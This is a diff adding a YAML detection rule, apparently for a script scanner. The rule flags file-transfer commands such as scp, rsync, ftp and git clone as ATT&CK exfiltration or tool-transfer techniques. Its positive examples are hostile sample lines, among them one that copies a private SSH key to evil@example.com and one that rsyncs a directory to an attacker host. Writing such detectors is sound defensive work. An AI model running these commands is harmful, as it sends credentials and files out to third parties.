@@ -1,0 +1,32 @@
+name: transfer
+version: "0.1.0"
+language: shell
+attck:
+  - T1105
+  - T1041
+message: >-
+  A file-transfer command moves a file between the build machine and a remote
+  host. Unlike an HTTP fetch it often carries credentials of its own, and it
+  runs in whichever direction the script asks for, so it is a way to send data
+  out as well as to bring code in.
+regex: '(?<=^|[^[:alnum:]_-])(scp|sftp|ftp|rsync|svn)(?=[^[:alnum:]_./-]|$)|(?<=^|[^[:alnum:]_-])git[[:space:]]+clone(?=[^[:alnum:]_./-]|$)'
+positive_examples:
+  - |
+    scp $HOME/.ssh/id_rsa evil@example.com:/tmp/
+  - |
+    rsync -az ./ evil.example.com::collect/
+  - |
+    git clone https://github.com/someone/helper /tmp/helper
+  - |
+    ftp -n evil.example.com < commands.txt
+  - |
+    sftp evil@example.com
+negative_examples:
+  - |
+    # git clone-ing this repo is documented in README
+  - |
+    PKG_LIBS=-lsvn_client-1
+  - |
+    ftputil_version=1.0
+  - |
+    SRCS=transfer.c
